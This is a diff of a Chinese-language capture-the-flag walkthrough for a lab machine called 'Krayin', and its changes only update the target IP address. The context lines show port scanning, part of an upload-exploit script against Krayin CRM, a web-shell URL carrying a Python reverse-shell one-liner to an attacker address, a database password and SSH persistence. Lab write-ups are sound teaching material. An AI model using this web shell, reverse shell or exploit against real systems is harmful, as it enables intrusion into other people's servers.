@@ -5,7 +5,7 @@ sidebar_position: 3
 
 # Krayin
 
-IP：`192.168.101.149`
+IP：`192.168.101.150`
 
 - user flag：`flag{user-5fd188d185e87bdc34fc0c1389d35409}`
 - root flag：`flag{root-ac0abf8a8a25305c77f1ff1130ee82ab}`
@@ -13,17 +13,17 @@ IP：`192.168.101.149`
 ## 一、信息收集
 
 ```bash
-rustscan -a 192.168.101.149
+rustscan -a 192.168.101.150
 ```
 
 ```
-Open 192.168.101.149:22
-Open 192.168.101.149:80
-Open 192.168.101.149:8080
+Open 192.168.101.150:22
+Open 192.168.101.150:80
+Open 192.168.101.150:8080
 ```
 
 ```bash
-nmap -sV -sC -p 22,80,8080 192.168.101.149
+nmap -sV -sC -p 22,80,8080 192.168.101.150
 ```
 
 ```
@@ -34,17 +34,17 @@ PORT     STATE SERVICE VERSION
 |_http-title: Dino Game
 8080/tcp open  http    nginx
 | http-title: Sign In
-|_Requested resource was http://192.168.101.149:8080/admin/login
+|_Requested resource was http://192.168.101.150:8080/admin/login
 MAC Address: 08:00:27:B1:2D:73 (Oracle VirtualBox virtual NIC)
 Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
 ```
 
 ```bash
-feroxbuster -u http://192.168.101.149:8080 -w /usr/share/wordlists/dirb/big.txt -x php,html,txt,bak,zip -t 50 --depth 2
+feroxbuster -u http://192.168.101.150:8080 -w /usr/share/wordlists/dirb/big.txt -x php,html,txt,bak,zip -t 50 --depth 2
 ```
 
 ```
-200      GET      587l     3199w    72758c http://192.168.101.149:8080/admin/login
+200      GET      587l     3199w    72758c http://192.168.101.150:8080/admin/login
 ```
 
 群主的靶机就是精炼啊！
@@ -54,7 +54,7 @@ feroxbuster -u http://192.168.101.149:8080 -w /usr/share/wordlists/dirb/big.txt 
 ```bash
 sudo nano /etc/hosts
 # 添加一行：
-192.168.101.149 krayin.dsz
+192.168.101.150 krayin.dsz
 ```
 
 貌似没有排上用场……
@@ -114,7 +114,7 @@ Webkul Krayin CRM v2.2.x 的 `/admin/tinymce/upload` 端点存在一个认证任
 import requests
 from bs4 import BeautifulSoup
 
-url = "http://192.168.101.149:8080"
+url = "http://192.168.101.150:8080"
 session = requests.Session()
 
 # 1. 获取登录页的 CSRF token
@@ -170,7 +170,7 @@ print(probe.text)
 反弹 shell：
 
 ```
-http://192.168.101.149:8080/storage/tinymce/586b4bcc58836546ae24f2eb0f531c34.php?cmd=python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.101.148",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/bash","-i"])'
+http://192.168.101.150:8080/storage/tinymce/586b4bcc58836546ae24f2eb0f531c34.php?cmd=python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.101.148",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/bash","-i"])'
 ```
 
 ## 三、横向移动与提权
@@ -187,7 +187,7 @@ DB_PASSWORD=root123
 SSH 公钥持久化：
 
 ```bash
-ssh -i krayin_key krayin@192.168.101.149
+ssh -i krayin_key krayin@192.168.101.150
 ```
 
 上传 linpeas.sh 进行信息收集。
